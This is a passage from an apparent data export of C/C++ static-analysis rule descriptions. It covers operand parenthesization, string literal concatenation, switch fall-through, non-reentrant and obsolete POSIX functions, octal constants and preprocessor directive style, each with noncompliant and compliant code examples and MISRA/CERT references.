if (x || (y &amp;&amp; z));
if (x &amp;&amp; (!y));
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; ((y &gt; c2) || (z &gt; c3)));
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
</ul>",c:LogicalExpressionOperands,c,C,"<p>The effect of this rule is to require that operands are appropriately parenthesized. Parentheses are important in this situation both for
readability of code and for ensuring that the behavior is as the developer intended.</p>
<p>Where an expression consists of either a sequence of only logical <code>&amp;&amp;</code> or a sequence of logical <code>||</code>, extra
parentheses are not required.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0 &amp;&amp; ishigh);                   // Noncompliant
if (x || y || z);
if (x || y &amp;&amp; z);                        // Noncompliant
if (x &amp;&amp; !y);                            // Noncompliant
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; (y &gt; c2) || (z &gt; c3));   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((x == 0) &amp;&amp; ishigh);
if (x || y || z);
if (x || (y &amp;&amp; z));
if (x &amp;&amp; (!y));
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; ((y &gt; c2) || (z &gt; c3)));
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
</ul>","Operands of ""&&"" and ""||"" should be primary (C) or postfix (C++) expressions",[],MAJOR,['misra'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Concatenation of wide and narrow string literals leads to undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
wchar_t n_array[] = ""Hello"" L""World"";     // Noncompliant
wchar_t w_array[] = L""Hello"" ""World"";     // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
char_t n_array[] = ""Hello"" ""World"";     // Compliant
wchar_t w_array[] = L""Hello"" L""World"";	// Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-5 - Narrow and wide string literals shall not be concatenated. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QIEzAg"">CERT STR10-C.</a> - Do not concatenate different type of string literals </li>
</ul>",c:NarrowAndWideStringConcat,c,C,"<p>Concatenation of wide and narrow string literals leads to undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
wchar_t n_array[] = ""Hello"" L""World"";     // Noncompliant
wchar_t w_array[] = L""Hello"" ""World"";     // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
char_t n_array[] = ""Hello"" ""World"";     // Compliant
wchar_t w_array[] = L""Hello"" L""World"";	// Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-5 - Narrow and wide string literals shall not be concatenated. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QIEzAg"">CERT STR10-C.</a> - Do not concatenate different type of string literals </li>
</ul>",Narrow and wide string literals should not be concatenated,[],MAJOR,"['cert', 'misra']",BUG
2013-09-16T11:41:23+0200,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw 1;
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>",c:NonEmptyCaseWithoutBreak,c,C,"<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw 1;
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/484.html"">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YIFLAQ"">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ewHAAQ"">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>","Switch cases should end with an unconditional ""break"" statement",[],BLOCKER,"['cert', 'cwe', 'misra', 'suspicious']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>A function is called reentrant if it can be interrupted in the middle of its execution and then safely called again (""re-entered"") before its
previous invocations complete execution.</p>
<p>It is especially important that multi-threaded applications do not call the same non-reentrant function from different threads.</p>
<p>This rule will trigger an issue each time a function in the configurable list is invoked.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a function that includes <code>localtime</code>:</p>
<pre>
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

void print_date_and_time(struct tm *time_ptr)
{
  printf(
    ""Current date and time: %d/%02d/%02d %02d:%02d:%02d\n"",
    time_ptr-&gt;tm_year + 1900,
    time_ptr-&gt;tm_mon,
    time_ptr-&gt;tm_mday,
    time_ptr-&gt;tm_hour,
    time_ptr-&gt;tm_min,
    time_ptr-&gt;tm_sec);
}

void print_unix_epoch_date_and_time()
{
  time_t unix_epoch_time = (time_t)0;
  struct tm *local_time_ptr = localtime(&amp;unix_epoch_time); // Noncompliant, call to the non-reentrant localtime() function
  print_date_and_time(local_time_ptr);
}

int main(int argc, char* argv[])
{
  time_t current_time;
  struct tm *local_time_ptr;

  time(&amp;current_time);

  local_time_ptr = localtime(&amp;current_time); // Noncompliant, call to the non-reentrant localtime() function

  // As expected, this will print: Current date and time: 1970/00/01 01:00:00
  print_unix_epoch_date_and_time();

  // This will actually also print Current date and time: 1970/00/01 01:00:00
  // Indeed, localtime() is non-reentrant, and always returns the same pointer
  print_date_and_time(local_time_ptr);

  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

void print_date_and_time(struct tm *time_ptr)
{
  printf(
    ""Current date and time: %d/%02d/%02d %02d:%02d:%02d\n"",
    time_ptr-&gt;tm_year + 1900,
    time_ptr-&gt;tm_mon,
    time_ptr-&gt;tm_mday,
    time_ptr-&gt;tm_hour,
    time_ptr-&gt;tm_min,
    time_ptr-&gt;tm_sec);
}

void print_unix_epoch_date_and_time()
{
  time_t unix_epoch_time = (time_t)0;
  struct tm local_time;
  localtime_r(&amp;unix_epoch_time, &amp;local_time); // Compliant
  print_date_and_time(&amp;local_time);
}

int main(int argc, char* argv[])
{
  time_t current_time;
  struct tm local_time;

  time(&amp;current_time);

  localtime_r(&amp;current_time, &amp;local_time); // Compliant

  // As expected, this will print: Current date and time: 1970/00/01 01:00:00
  print_unix_epoch_date_and_time();

  // As expected, this will print the current date and time, as expected
  print_date_and_time(&amp;local_time);

  return 0;
}
</pre>",c:NonReentrantFunction,c,C,"<p>A function is called reentrant if it can be interrupted in the middle of its execution and then safely called again (""re-entered"") before its
previous invocations complete execution.</p>
<p>It is especially important that multi-threaded applications do not call the same non-reentrant function from different threads.</p>
<p>This rule will trigger an issue each time a function in the configurable list is invoked.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a function that includes <code>localtime</code>:</p>
<pre>
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

void print_date_and_time(struct tm *time_ptr)
{
  printf(
    ""Current date and time: %d/%02d/%02d %02d:%02d:%02d\n"",
    time_ptr-&gt;tm_year + 1900,
    time_ptr-&gt;tm_mon,
    time_ptr-&gt;tm_mday,
    time_ptr-&gt;tm_hour,
    time_ptr-&gt;tm_min,
    time_ptr-&gt;tm_sec);
}

void print_unix_epoch_date_and_time()
{
  time_t unix_epoch_time = (time_t)0;
  struct tm *local_time_ptr = localtime(&amp;unix_epoch_time); // Noncompliant, call to the non-reentrant localtime() function
  print_date_and_time(local_time_ptr);
}

int main(int argc, char* argv[])
{
  time_t current_time;
  struct tm *local_time_ptr;

  time(&amp;current_time);

  local_time_ptr = localtime(&amp;current_time); // Noncompliant, call to the non-reentrant localtime() function

  // As expected, this will print: Current date and time: 1970/00/01 01:00:00
  print_unix_epoch_date_and_time();

  // This will actually also print Current date and time: 1970/00/01 01:00:00
  // Indeed, localtime() is non-reentrant, and always returns the same pointer
  print_date_and_time(local_time_ptr);

  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

void print_date_and_time(struct tm *time_ptr)
{
  printf(
    ""Current date and time: %d/%02d/%02d %02d:%02d:%02d\n"",
    time_ptr-&gt;tm_year + 1900,
    time_ptr-&gt;tm_mon,
    time_ptr-&gt;tm_mday,
    time_ptr-&gt;tm_hour,
    time_ptr-&gt;tm_min,
    time_ptr-&gt;tm_sec);
}

void print_unix_epoch_date_and_time()
{
  time_t unix_epoch_time = (time_t)0;
  struct tm local_time;
  localtime_r(&amp;unix_epoch_time, &amp;local_time); // Compliant
  print_date_and_time(&amp;local_time);
}

int main(int argc, char* argv[])
{
  time_t current_time;
  struct tm local_time;

  time(&amp;current_time);

  localtime_r(&amp;current_time, &amp;local_time); // Compliant

  // As expected, this will print: Current date and time: 1970/00/01 01:00:00
  print_unix_epoch_date_and_time();

  // As expected, this will print the current date and time, as expected
  print_date_and_time(&amp;local_time);

  return 0;
}
</pre>",Non-reentrant POSIX functions should be replaced with their reentrant versions,"[{'key': 'nonReentrantFunctionList', 'htmlDesc': 'List of non-reentrant functions', 'defaultValue': 'crypt,ctermid,ecvt,fcvt,fgetgrent,fgetpwent,fgetspent,gcvt,getgrent,getgrgid,getgrnam,gethostbyaddr,gethostbyname,gethostbyname2,gethostent,getlogin,getnetbyaddr,getnetbyname,getnetgrent,getprotobyname,getpwent,getpwnam,getpwuid,getrpcbyname,getrpcbynumber,getrpcent,getservbyname,getservbyport,getservent,getspent,getspnam,gmtime,localtime,readdir,strtok,tempnam,ttyname', 'type': 'STRING'}]",BLOCKER,['multi-threading'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>To ensure future code portability, obsolete POSIX functions should be removed. Those functions, with their replacements are listed below:</p>
<table>
  <tbody>
    <tr>
      <th>Obsolete</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td>asctime</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>asctime_r</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>bcmp</td>
      <td>memcmp</td>
    </tr>
    <tr>
      <td>bcopy</td>
      <td>memmove memcpy</td>
    </tr>
    <tr>
      <td>bsd_signal</td>
      <td>sigaction</td>
    </tr>
    <tr>
      <td>bzero</td>
      <td>memset</td>
    </tr>
    <tr>
      <td>ctime</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>ecvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>fcvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>ftime</td>
      <td>no replacement function</td>
    </tr>
    <tr>
      <td>gcvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>getcontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>gethostbyaddr</td>
      <td>getnameinfo</td>
    </tr>
    <tr>
      <td>gethostbyname</td>
      <td>getaddrinfo</td>
    </tr>
    <tr>
      <td>getwd</td>
      <td>getcwd</td>
    </tr>
    <tr>
      <td>index</td>
      <td>strchr</td>
    </tr>
    <tr>
      <td>makecontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>pthread_attr_getstackaddr</td>
      <td>pthread_attr_getstack</td>
    </tr>
    <tr>
      <td>pthread_attr_setstackaddr</td>
      <td>pthread_attr_setstack</td>
    </tr>
    <tr>
      <td>rand_r</td>
      <td>rand</td>
    </tr>
    <tr>
      <td>rindex</td>
      <td>strrchr</td>
    </tr>
    <tr>
      <td>scalb</td>
      <td>scalbln', 'scalblnf' or 'scalblnl' instead of this function</td>
    </tr>
    <tr>
      <td>swapcontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>tmpnam</td>
      <td>'tmpfile', 'mkstemp', or 'mkdtemp' instead for this function</td>
    </tr>
    <tr>
      <td>tmpnam_r</td>
      <td>tmpfile', 'mkstemp', or 'mkdtemp' instead for this function</td>
    </tr>
    <tr>
      <td>ualarm</td>
      <td>'timer_create', 'timer_delete', 'timer_getoverrun', 'timer_gettime', or 'timer_settime' instead of this function</td>
    </tr>
    <tr>
      <td>usleep</td>
      <td>'nanosleep' or 'setitimer' function</td>
    </tr>
    <tr>
      <td>utime</td>
      <td>utimensat</td>
    </tr>
    <tr>
      <td>vfork</td>
      <td>fork</td>
    </tr>
    <tr>
      <td>wcswcs</td>
      <td>wcsstr</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/EgAa"">CERT, POS33-C.</a> - Do not use vfork() </li>
</ul>",c:ObsoletePosixFunction,c,C,"<p>To ensure future code portability, obsolete POSIX functions should be removed. Those functions, with their replacements are listed below:</p>
<table>
  <tbody>
    <tr>
      <th>Obsolete</th>
      <th>Use Instead</th>
    </tr>
    <tr>
      <td>asctime</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>asctime_r</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>bcmp</td>
      <td>memcmp</td>
    </tr>
    <tr>
      <td>bcopy</td>
      <td>memmove memcpy</td>
    </tr>
    <tr>
      <td>bsd_signal</td>
      <td>sigaction</td>
    </tr>
    <tr>
      <td>bzero</td>
      <td>memset</td>
    </tr>
    <tr>
      <td>ctime</td>
      <td>strftime</td>
    </tr>
    <tr>
      <td>ecvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>fcvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>ftime</td>
      <td>no replacement function</td>
    </tr>
    <tr>
      <td>gcvt</td>
      <td>sprintf</td>
    </tr>
    <tr>
      <td>getcontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>gethostbyaddr</td>
      <td>getnameinfo</td>
    </tr>
    <tr>
      <td>gethostbyname</td>
      <td>getaddrinfo</td>
    </tr>
    <tr>
      <td>getwd</td>
      <td>getcwd</td>
    </tr>
    <tr>
      <td>index</td>
      <td>strchr</td>
    </tr>
    <tr>
      <td>makecontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>pthread_attr_getstackaddr</td>
      <td>pthread_attr_getstack</td>
    </tr>
    <tr>
      <td>pthread_attr_setstackaddr</td>
      <td>pthread_attr_setstack</td>
    </tr>
    <tr>
      <td>rand_r</td>
      <td>rand</td>
    </tr>
    <tr>
      <td>rindex</td>
      <td>strrchr</td>
    </tr>
    <tr>
      <td>scalb</td>
      <td>scalbln', 'scalblnf' or 'scalblnl' instead of this function</td>
    </tr>
    <tr>
      <td>swapcontext</td>
      <td>Rewrite to use POSIX threads.</td>
    </tr>
    <tr>
      <td>tmpnam</td>
      <td>'tmpfile', 'mkstemp', or 'mkdtemp' instead for this function</td>
    </tr>
    <tr>
      <td>tmpnam_r</td>
      <td>tmpfile', 'mkstemp', or 'mkdtemp' instead for this function</td>
    </tr>
    <tr>
      <td>ualarm</td>
      <td>'timer_create', 'timer_delete', 'timer_getoverrun', 'timer_gettime', or 'timer_settime' instead of this function</td>
    </tr>
    <tr>
      <td>usleep</td>
      <td>'nanosleep' or 'setitimer' function</td>
    </tr>
    <tr>
      <td>utime</td>
      <td>utimensat</td>
    </tr>
    <tr>
      <td>vfork</td>
      <td>fork</td>
    </tr>
    <tr>
      <td>wcswcs</td>
      <td>wcsstr</td>
    </tr>
  </tbody>
</table>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/EgAa"">CERT, POS33-C.</a> - Do not use vfork() </li>
</ul>",Obsolete POSIX functions should not be used,[],MAJOR,"['cert', 'obsolete']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
int myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",c:OctalConstantAndSequence,c,C,"<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
int myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used. </li>
  <li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than ""\0"") shall not be used </li>
  <li> MISRA C:2012, 7.1 - Octal constants shall not be used </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/_QC7AQ"">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",Octal values should not be used,[],BLOCKER,"['cert', 'misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>
<h2>Exceptions</h2>
<p>Control flow statements with a single nested statement are ignored.</p>
<pre>
if (condition) doSomething();       // Compliant
while (condition) doSomething();    // Compliant
</pre>
<p><code>case</code> or <code>default</code> statements containing a single statement and followed by <code>break</code> are ignored.</p>
<pre>
switch (foo) {
  case  0: doSomething(); break;    // Compliant
  default: doSomething(); break;    // Compliant
}
</pre>
<p>Statements enclosed in curly braces on the same line are ignored.</p>
<pre>
auto lambda = [](int x) { doSomething(x); return x; }; // Compliant
</pre>",c:OneStatementPerLine,c,C,"<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>
<h2>Exceptions</h2>
<p>Control flow statements with a single nested statement are ignored.</p>
<pre>
if (condition) doSomething();       // Compliant
while (condition) doSomething();    // Compliant
</pre>
<p><code>case</code> or <code>default</code> statements containing a single statement and followed by <code>break</code> are ignored.</p>
<pre>
switch (foo) {
  case  0: doSomething(); break;    // Compliant
  default: doSomething(); break;    // Compliant
}
</pre>
<p>Statements enclosed in curly braces on the same line are ignored.</p>
<pre>
auto lambda = [](int x) { doSomething(x); return x; }; // Compliant
</pre>",Statements should be on separate lines,[],MAJOR,['style'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>",c:ParsingError,c,C,"<p>When the parser fails, it is possible to record the failure as an issue on the file. This way, not only is it possible to track the number of files
that do not parse but also to easily find out why they do not parse.</p>",Track parsing failures,[],MAJOR,['suspicious'],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>The standard mentions that the line continuation character (<code>\</code>) should be immediately followed by a newline or be the very last
character of the file in order for the lines to be joined.</p>
<p>Several compilers relax this requirement by allowing whitespace after the <code>\</code> character, but this is not portable because other
compilers may not do the same.</p>
<h2>Compliant Solution</h2>
<pre>
// There should be no whitespace after the '\'
#define FOO BAR \
            BAZ
</pre>",c:PPBackslashNotLastCharacter,c,C,"<p>The standard mentions that the line continuation character (<code>\</code>) should be immediately followed by a newline or be the very last
character of the file in order for the lines to be joined.</p>
<p>Several compilers relax this requirement by allowing whitespace after the <code>\</code> character, but this is not portable because other
compilers may not do the same.</p>
<h2>Compliant Solution</h2>
<pre>
// There should be no whitespace after the '\'
#define FOO BAR \
            BAZ
</pre>",Line continuation characters '\' should not be followed by trailing whitespace,[],MINOR,[],BUG
2013-09-16T11:41:23+0200,"<p>These are the only forms for the <code>#include</code> directive permitted by the standard. The behavior is undefined when other forms are
used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include filename.h        // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
#include ""filename.h""        // Compliant
#include &lt;filename.h&gt;

#define HEADER ""filename.h""
#include HEADER
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.3 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence. </li>
  <li> MISRA C++:2008, 16-2-6 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence. </li>
  <li> MISRA C:2012, 20.3 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence </li>
</ul>",c:PPBadIncludeForm,c,C,"<p>These are the only forms for the <code>#include</code> directive permitted by the standard. The behavior is undefined when other forms are
used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include filename.h        // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
#include ""filename.h""        // Compliant
#include &lt;filename.h&gt;

#define HEADER ""filename.h""
#include HEADER
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.3 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence. </li>
  <li> MISRA C++:2008, 16-2-6 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence. </li>
  <li> MISRA C:2012, 20.3 - The #include directive shall be followed by either a &lt;filename&gt; or ""filename"" sequence </li>
</ul>","""#include"" directives should be followed by either <filename> or ""filename"" sequences",[],MAJOR,['misra'],BUG
2013-09-16T11:41:23+0200,"<p>While it is legal to place <code>#define</code> and <code>#undef</code> directives anywhere in a source file, placing them outside of the global
namespace is misleading since their scope is not actually restricted. This may be inconsistent with developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace NS
{
  #ifndef MY_HDR
  #define MY_HDR    /* Noncompliant */
  #undef FOO        /* Noncompliant */
  #endif
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#ifndef MY_HDR
#define MY_HDR
#undef FOO
#endif
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.5 - Macros shall not be #define'd or #undef'd within a block. </li>
  <li> MISRA C++:2008, 16-0-2 - Macros shall only be #define'd or #undef'd in the global namespace. </li>
</ul>",c:PPDefineOrUndefFromBlock,c,C,"<p>While it is legal to place <code>#define</code> and <code>#undef</code> directives anywhere in a source file, placing them outside of the global
namespace is misleading since their scope is not actually restricted. This may be inconsistent with developer expectations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
namespace NS
{
  #ifndef MY_HDR
  #define MY_HDR    /* Noncompliant */
  #undef FOO        /* Noncompliant */
  #endif
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#ifndef MY_HDR
#define MY_HDR
#undef FOO
#endif
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.5 - Macros shall not be #define'd or #undef'd within a block. </li>
  <li> MISRA C++:2008, 16-0-2 - Macros shall only be #define'd or #undef'd in the global namespace. </li>
</ul>",Macros should not be #define'd or #undef'd within a block,[],CRITICAL,"['misra', 'pitfall']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>Indenting preprocessor directives reduces the code readability, because it make preprocessor directives harder to spot.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void optimal()
{
  #if INTEL             /* Noncompliant - hard to spot */
  specificIntelStuff();
  #endif                /* Noncompliant - hard to spot */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void optimal()
{
#if INTEL               /* Compliant */
  specificIntelStuff();
#endif                  /* Compliant */
}
</pre>",c:PPDirectiveIndentation,c,C,"<p>Indenting preprocessor directives reduces the code readability, because it make preprocessor directives harder to spot.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void optimal()
{
  #if INTEL             /* Noncompliant - hard to spot */
  specificIntelStuff();
  #endif                /* Noncompliant - hard to spot */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void optimal()
{
#if INTEL               /* Compliant */
  specificIntelStuff();
#endif                  /* Compliant */
}
</pre>",Preprocessor directives should not be indented,[],CRITICAL,"['pitfall', 'style']",CODE_SMELL
2013-09-16T11:41:23+0200,"<p>This rule creates a issue whenever an <code>#error</code> preprocessor directive is reached during the project's analysis. In most cases, this
indicates that the preprocessor was badly configured. Some predefined macros or library include paths might be required to fix the configuration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#error This is an error
</pre>",c:PPErrorDirectiveReached,c,C,"<p>This rule creates a issue whenever an <code>#error</code> preprocessor directive is reached during the project's analysis. In most cases, this
indicates that the preprocessor was badly configured. Some predefined macros or library include paths might be required to fix the configuration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#error This is an error
</pre>","Track instances of the ""#error"" preprocessor directive being reached",[],INFO,[],CODE_SMELL
2013-09-16T11:41:23+0200,"<p>If the <code>'</code>, <code>\</code>, <code>""</code> or <code>/*</code> characters are used between <code>&lt;</code> and <code>&gt;</code>
delimiters or the <code>'</code>, <code>\</code> or <code>/*</code> characters are used between the <code>""</code> delimiters in a header name
preprocessing token, then the behavior is undefined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#include &lt;""foo""&gt;     // Noncompliant
#include ""dir\foo.h"" // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.2 - Non-standard characters should not occur in header file names in #include directives. </li>
  <li> MISRA C++:2008, 16-2-4 - The ', "", /* or // characters shall not occur in a header file name. </li>
  <li> MISRA C++:2008, 16-2-5 - The \ character should not occur in a header file name. </li>
